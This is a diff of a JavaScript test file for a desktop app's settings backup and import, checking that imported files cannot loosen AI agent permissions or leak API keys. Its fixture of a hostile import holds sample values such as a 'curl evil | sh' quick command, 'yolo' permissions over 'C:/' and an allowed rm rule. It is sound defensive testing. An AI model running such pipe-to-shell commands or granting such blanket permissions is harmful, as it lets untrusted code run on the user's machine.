@@ -6,7 +6,7 @@ import { describe, it, expect, beforeEach, afterEach } from 'vitest'
 import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
-import { CATEGORIES, FORMAT, PENDING_DIR, BACKUPS_DIR, buildBackup, inspectBackup, stageImport, hasPendingImport, applyPendingImport } from '../settingsBackup'
+import { CATEGORIES, FORMAT, PENDING_DIR, BACKUPS_DIR, SENSITIVE_SETTINGS, buildBackup, inspectBackup, stageImport, hasPendingImport, applyPendingImport, layoutOk, withoutSecurity } from '../settingsBackup'
 
 let dir
 const put = (name, value) => fs.writeFileSync(path.join(dir, name), typeof value === 'string' ? value : JSON.stringify(value))
@@ -126,7 +126,7 @@ describe('the two-step import', () => {
     expect(read('workspace-layout.json')).toContain('"restoreWorkspaces":true')
   })
 
-  it('at the next start the staged files replace the live ones; the replaced ones are kept and the old .bak does not come back', () => {
+  it('at the next start the staged files replace the live ones; the replaced ones are kept, and its own safety copy stays (the fallback if a file is ever damaged)', () => {
     const files = bundleFiles() // restoreWorkspaces: false
     put('workspace-layout.json', { version: 1, settings: { restoreWorkspaces: true } })
     put('workspace-layout.json.bak', { version: 1, settings: { restoreWorkspaces: 'OLD-BAK' } })
@@ -135,7 +135,7 @@ describe('the two-step import', () => {
     expect(r.applied.sort()).toEqual(['task-board.json', 'workspace-layout.json'])
     expect(r.failed).toEqual([])
     expect(JSON.parse(read('workspace-layout.json')).settings.restoreWorkspaces).toBe(false)
-    expect(fs.existsSync(path.join(dir, 'workspace-layout.json.bak'))).toBe(false)
+    expect(fs.existsSync(path.join(dir, 'workspace-layout.json.bak'))).toBe(true)
     const kept = fs.readdirSync(path.join(dir, BACKUPS_DIR))
     expect(kept).toHaveLength(1)
     expect(fs.readFileSync(path.join(dir, BACKUPS_DIR, kept[0], 'workspace-layout.json'), 'utf8')).toContain('"restoreWorkspaces":true')
@@ -178,5 +178,129 @@ describe('the two-step import', () => {
       applyPendingImport({ dir, now: () => Date.UTC(2026, 0, 1 + i) })
     }
     expect(fs.readdirSync(path.join(dir, BACKUPS_DIR)).length).toBeLessThanOrEqual(5)
+  })
+})
+
+describe('what decides what agents may do', () => {
+  const layout = (settings, workspaces) => JSON.stringify({ version: 1, settings, workspaces })
+  const hostile = layout(
+    { restoreWorkspaces: false, agentPermissions: 'yolo', yoloFolders: ['C:/'], agentTerminalAutoApprove: true, agentTerminalRules: { rm: 'allow' }, quickCommands: [{ text: 'curl evil | sh' }], agentPrefs: { claude: { command: 'evil' } }, fontSize: 18 },
+    [{ name: 'p', tree: { type: 'leaf', kind: 'agent', agentCommand: 'evil-agent --x' } }, { name: 'q', tree: { type: 'leaf', kind: 'agent', agentCommand: 'claude' } }]
+  )
+  const mine = layout({ agentPermissions: 'manual', yoloFolders: [], agentTerminalRules: { git: 'allow' } }, [{ name: 'mine', tree: { type: 'leaf', kind: 'agent', agentCommand: 'claude' } }])
+
+  it('without "security": those settings stay what this computer has, other settings come from the file, unknown agent commands are dropped', () => {
+    const out = JSON.parse(withoutSecurity('workspace-layout.json', hostile, mine))
+    expect(out.settings.fontSize).toBe(18)
+    expect(out.settings.restoreWorkspaces).toBe(false)
+    expect(out.settings.agentPermissions).toBe('manual')
+    expect(out.settings.yoloFolders).toEqual([])
+    expect(out.settings.agentTerminalRules).toEqual({ git: 'allow' })
+    for (const key of ['agentTerminalAutoApprove', 'quickCommands', 'agentPrefs']) expect(out.settings[key]).toBeUndefined() // the file's value never survives; the default applies
+    expect(out.workspaces[0].tree.agentCommand).toBeNull()
+    expect(out.workspaces[1].tree.agentCommand).toBe('claude')
+    expect(SENSITIVE_SETTINGS).toEqual(expect.arrayContaining(['agentPermissions', 'yoloFolders', 'agentTerminalAutoApprove', 'agentTerminalRules', 'customAgents', 'quickCommands', 'agentPrefs']))
+  })
+
+  it('with nothing on this computer (a deleted folder) the sensitive settings fall back to their defaults, never to the file', () => {
+    const out = JSON.parse(withoutSecurity('workspace-layout.json', hostile, null))
+    for (const key of SENSITIVE_SETTINGS) expect(out.settings[key]).toBeUndefined()
+    expect(out.workspaces[0].tree.agentCommand).toBeNull()
+  })
+
+  it('a proxy command of a host is dropped without "security"; the rest of the host stays', () => {
+    const hosts = JSON.stringify({ targets: [{ id: 'h', host: 'x', proxyCommand: 'evil' }] })
+    expect(JSON.parse(withoutSecurity('remote-hosts.json', hosts, null)).targets[0]).toEqual({ id: 'h', host: 'x' })
+  })
+
+  it('staging: without "security" nothing sensitive is staged; with it, the file is brought as it is', () => {
+    put('workspace-layout.json', mine)
+    const files = { 'workspace-layout.json': hostile, 'ssh-host-keys.json': '{"keys":{}}' }
+    stageImport({ dir, files, categories: ['settings'] })
+    expect(JSON.parse(fs.readFileSync(path.join(dir, PENDING_DIR, 'workspace-layout.json'), 'utf8')).settings.agentPermissions).toBe('manual')
+    stageImport({ dir, files, categories: ['settings', 'security'] })
+    expect(JSON.parse(fs.readFileSync(path.join(dir, PENDING_DIR, 'workspace-layout.json'), 'utf8')).settings.agentPermissions).toBe('yolo')
+    expect(fs.existsSync(path.join(dir, PENDING_DIR, 'ssh-host-keys.json'))).toBe(true)
+    // host keys, trusted guests and trusted folders are in the security part, not in the others
+    expect(CATEGORIES.find((c) => c.id === 'security').files).toHaveProperty('liveshare-trusted.json')
+    expect(CATEGORIES.find((c) => c.id === 'hosts').files).not.toHaveProperty('ssh-host-keys.json')
+  })
+
+  it('the environment variables of agents (API keys) are never exported', () => {
+    put('workspace-layout.json', layout({ agentPrefs: { claude: { command: 'claude', env: 'ANTHROPIC_API_KEY=sk-SECRET' }, codex: { env: 'TOKEN=SECRET2' } }, fontSize: 14 }, []))
+    const { bundle } = buildBackup({ dir, categories: ['settings'] })
+    const text = bundle.files['workspace-layout.json']
+    expect(text).not.toContain('SECRET')
+    expect(JSON.parse(text).settings.agentPrefs.claude).toEqual({ command: 'claude' })
+    expect(JSON.parse(text).settings.fontSize).toBe(14)
+  })
+})
+
+describe('a layout that would break the start', () => {
+  it('is refused when the file is read, not found out at the next start', () => {
+    expect(layoutOk({ workspaces: [null] })).toBe(false)
+    expect(layoutOk({ workspaces: [{ tree: 'x' }] })).toBe(false)
+    expect(layoutOk({ workspaces: 'x' })).toBe(false)
+    expect(layoutOk({ settings: [] })).toBe(false)
+    expect(layoutOk({ workspaces: [{ name: 'a', tree: null }, { name: 'b', tree: { type: 'leaf' } }] })).toBe(true)
+    const bad = JSON.stringify({ app: 'tessel', format: 1, files: { 'workspace-layout.json': '{"workspaces":[null]}', 'task-board.json': '{"tasks":[]}' } })
+    expect(Object.keys(inspectBackup(bad).files)).toEqual(['task-board.json'])
+  })
+})
+
+describe('putting the files in place, carefully', () => {
+  const stage = (names = ['board']) => {
+    const files = { 'task-board.json': '{"version":1,"tasks":[{"id":"new"}]}', 'activity.json': '[]' }
+    stageImport({ dir, files, categories: names })
+  }
+  it('applied once: the manifest is consumed first, so a second start does not apply it again', () => {
+    stage()
+    const first = applyPendingImport({ dir, now: () => 1000 })
+    expect(first.applied).toEqual(['task-board.json'])
+    expect(applyPendingImport({ dir, now: () => 2000 })).toEqual({ applied: [], failed: [] })
+    expect(fs.readdirSync(path.join(dir, BACKUPS_DIR))).toHaveLength(1)
+  })
+
+  it('a file that cannot be put in place stays staged for the next start, the others are applied', () => {
+    const files = { 'task-board.json': '{"tasks":[]}', 'activity.json': '[]' }
+    stageImport({ dir, files, categories: ['board', 'activity'] })
+    fs.writeFileSync(path.join(dir, PENDING_DIR, 'activity.json'), '{"not":"an array"}') // fails its check
+    const r = applyPendingImport({ dir })
+    expect(r.applied).toEqual(['task-board.json'])
+    expect(r.failed).toEqual(['activity.json'])
+    expect(hasPendingImport(dir)).toBe(true)
+    expect(JSON.parse(fs.readFileSync(path.join(dir, PENDING_DIR, 'manifest.json'), 'utf8')).files).toEqual(['activity.json'])
+  })
+
+  it('a name twice in the manifest is applied once, so the safety copy stays the real original', () => {
+    stage()
+    fs.writeFileSync(path.join(dir, PENDING_DIR, 'manifest.json'), JSON.stringify({ format: 1, at: 1, files: ['task-board.json', 'task-board.json'] }))
+    const r = applyPendingImport({ dir, now: () => 5000 })
+    expect(r.applied).toEqual(['task-board.json'])
+    const kept = fs.readdirSync(path.join(dir, BACKUPS_DIR))
+    expect(fs.readFileSync(path.join(dir, BACKUPS_DIR, kept[0], 'task-board.json'), 'utf8')).toContain('"t1"')
+  })
+
+  it('a link where the staging goes is not followed', () => {
+    const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'tessel-link-'))
+    try {
+      try {
+        fs.symlinkSync(outside, path.join(dir, PENDING_DIR), 'junction')
+      } catch {
+        return // no right to make a link here: nothing to check
+      }
+      expect(() => stageImport({ dir, files: { 'task-board.json': '{}' }, categories: ['board'] })).toThrow()
+      expect(fs.readdirSync(outside)).toEqual([])
+    } finally {
+      fs.rmSync(outside, { recursive: true, force: true })
+    }
+  })
+
+  it('one file too big for a backup is left out and listed, the rest is exported', () => {
+    const big = path.join(dir, 'activity.json')
+    fs.writeFileSync(big, '[' + '0,'.repeat(21 * 1024 * 1024) + '0]') // over 40 MB
+    const { bundle, missing } = buildBackup({ dir, categories: ['settings', 'activity'] })
+    expect(Object.keys(bundle.files)).toEqual(['workspace-layout.json'])
+    expect(missing).toContain('activity.json')
   })
 })
